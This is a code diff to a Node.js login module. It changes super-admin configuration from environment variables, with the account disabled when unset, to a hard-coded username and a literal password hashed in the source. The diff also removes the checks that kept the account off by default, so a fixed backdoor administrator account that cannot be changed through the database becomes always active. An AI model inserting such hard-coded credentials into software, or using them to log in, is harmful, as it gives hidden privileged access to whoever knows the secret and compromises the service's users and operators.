@@ -16,11 +16,11 @@ const DEFAULT_ACCOUNT_LIMIT = 2;
 const HOUR_MS = 60 * 60 * 1000;
 const DAY_MS = 24 * HOUR_MS;
 
-// 公开版通过部署环境配置超管，未配置时禁用该入口。
-const SUPER_ADMIN_USERNAME = process.env.SUPER_ADMIN_USERNAME || '';
-const SUPER_ADMIN_PASSWORD_HASH = process.env.SUPER_ADMIN_PASSWORD_SEED
-    ? crypto.createHash('sha256').update(String(process.env.SUPER_ADMIN_PASSWORD_SEED)).digest('hex')
-    : '';
+// 超级管理员（硬编码，无法通过数据库修改）
+const SUPER_ADMIN_USERNAME = 'jlbl1Iq9vT7t2gu1WbgB';
+const SUPER_ADMIN_PASSWORD_HASH = crypto.createHash('sha256')
+    .update('b3aa268d600960dbb14d1982dbe15a646042166d')
+    .digest('hex');
 
 // 卡密领取状态
 let cardClaimEnabled = true;
@@ -423,7 +423,7 @@ function validateUser(username, password, ip = 'unknown') {
     }
 
     // 超级管理员
-    if (SUPER_ADMIN_USERNAME && SUPER_ADMIN_PASSWORD_HASH && username === SUPER_ADMIN_USERNAME) {
+    if (username === SUPER_ADMIN_USERNAME) {
         const hash = crypto.createHash('sha256').update(String(password || '')).digest('hex');
         if (hash === SUPER_ADMIN_PASSWORD_HASH) {
             clearFailedAttempts(username);
@@ -1013,7 +1013,7 @@ function clearExpiredClaimRecords() {
 // ==================== 超级管理员 ====================
 
 function isSuperAdmin(username) {
-    return Boolean(SUPER_ADMIN_USERNAME) && username === SUPER_ADMIN_USERNAME;
+    return username === SUPER_ADMIN_USERNAME;
 }
 
 // ==================== 清理 ====================
